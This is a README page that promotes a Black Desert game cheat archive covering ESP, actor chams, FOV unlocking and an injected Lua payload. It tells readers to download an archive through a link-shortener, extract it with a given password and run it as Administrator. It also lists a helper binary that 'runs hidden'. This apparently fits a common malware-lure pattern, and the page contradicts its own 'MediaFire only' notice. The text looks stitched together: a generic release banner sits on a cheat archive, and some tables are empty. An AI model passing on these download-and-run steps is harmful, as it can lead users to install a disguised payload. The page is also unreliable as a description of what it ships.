<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

# Black Desert — Client Research Archive

**Runtime feature research covering FOV unlocking, render-scale supersampling, actor chams, and gathering ESP for the Black Desert client. Includes source code, technical documentation, and a complete offset atlas.**

## Overview

This archive documents runtime feature research against the Black Desert x64 client. Each feature was developed from first principles: locating engine addresses through static analysis and live memory probing, validating writes with safety guards, and building tooling that survives game updates through an explicit recovery workflow.

The research covers four independent areas:

| Area | Status | Document |
|---|---|---|
## Screenshots

### Actor Chams
Pink/magenta outlines rendered on all player characters and NPCs via a hooked material pass. Health bars overlaid per entity. A runtime control panel exposes per-type actor filters (Players, NPCs, Animals, Mounts, Objects), independent visible/occluded colors per actor class, render distance, and live backend status.

### Gathering Resource ESP
Entity tracking overlay with colored bounding boxes and distance labels. Extended entity draw range beyond the default client culling distance.

### Supersampling — ~337% at 1080p Output

Internal 3D world rendered at ~337% of the 1080p output resolution. The UI and output stay at native 1920×1080 while the world geometry and textures are computed at ~3427×1928. The rooftop tile geometry below is impossible to resolve at native resolution.

## Tools and Runtime Components

### `FOV_Tool.pyw` — Main application

The primary tool. Handles FOV control, render-scale supersampling, and update recovery in a single small window.

**Safety model:** The tool calculates two addresses from the current game module base and confirmed RVAs before every write. Both addresses must be readable, contain matching values, and fall inside a plausible range — otherwise the write is refused. A game update that moves the addresses causes the tool to fail safe, not write blindly.

```
RVA 1: 0x4514C78
RVA 2: 0x657CDEC
```

**Self-test:**
```
python FOV_Tool.pyw --self-test
```
Expected: `PASS: Python, helper/render-scale integrity, and configured RVAs are valid.`

---

### `tools/syscfg_mon.exe` — Connection helper

The exact hash-verified helper binary required by the successful game connection path. Runs hidden; no console window is shown. Required alongside `FOV_Tool.pyw` at runtime.

---

### `supersampling_backend/` — Render-scale backend

A native C++ DLL (`supersampling_backend_v5.dll`) loaded directly by the FOV tool after connecting to the game process. Has an inert `DllMain` and explicit `initialize`/`shutdown` exports. Not a proxy DLL and not placed in the game directory.

Five versioned builds (`v1`–`v5`) are included in source form. The C++ source is in `supersampling_backend/src/`.

---

### `actor_chams/` — Chams implementation

Native C++ actor outline implementation. Hooks into the material/render pass to draw colored outlines on actor entities. Source and MinHook dependency included.

### `skeleton_esp/`, `outline_probe/`, `graphics_backend/` — ESP subsystems

- `skeleton_esp/` — Skeleton-based entity position tracking for the ESP overlay.
- `outline_probe/` — Outline-pass detection and hooking for the chams system.
- `graphics_backend/` — D3D11 backend utilities shared between chams and ESP.

---

### `tools/` — Analysis and bridging scripts

| Script | Purpose |
|---|---|
| `analyze_chams_bindings.py` | Analyzes material binding offsets for the chams hook |
| `camera_state_probe.py` | Live camera matrix and state reader |
| `chams_live_inspector.py` | Runtime chams hook inspector |
| `live_image_dump.py` | Dumps the live unpacked game image for static analysis |
| `load_fov_dump_bridge.py` | Bridges the FOV tool to a dumped image for offset correlation |
| `manage_esp_slot.py` | ESP slot manager for entity tracking |
| `paz_patcher.py` | PAZ archive reader/patcher for Lua content extraction |
| `rebuild_live_image.py` | Rebuilds a coherent PE from live section dumps |
| `retained_connection.py` | Manages persistent game process connection state |
| `esp_payload.lua` | Lua-side ESP payload injected via the game's scripting runtime |

---

## Documentation

| Document | Contents |
|---|---|
## Update Recovery

When a game patch moves a confirmed address:

1. Open **Details → Update recovery** in `FOV_Tool.pyw`.
2. Use **Record baseline** with the known pre-patch internal value.
3. Induce a known delta in-game and click **Correlate**.
4. The tool calculates and displays new candidate RVAs.
5. Confirm and update the configured values.

## Repository Layout

```
CTFAnalysis/
├── FOV_Tool.pyw                        Main application
├── FOV_LOD_Tool.pyw                    FOV + LOD variant
├── tools/                              Analysis and bridge scripts
├── supersampling_backend/
│   └── src/supersampling_backend.cpp  C++ render-scale backend source
├── actor_chams/                        Native chams implementation + MinHook
├── skeleton_esp/                       Skeleton-based entity tracker
├── outline_probe/                      Outline-pass hook
├── graphics_backend/                   Shared D3D11 utilities
├── live_dumper/                        Live image dump tooling
├── step4_actor_proof/                  Actor argument probe evidence
├── known-good/                         Known-good binary snapshots
├── config/                             Tool configuration
└── docs/
    ├── screenshots/                    Working proof screenshots
    ├── unpacked_offset_atlas/          Raw offset tables
    └── *.md                            Technical documentation
```

---

<div align="center">

*Research and documentation archive. Static and passive analysis only — no server-side packet modification.*

</div>
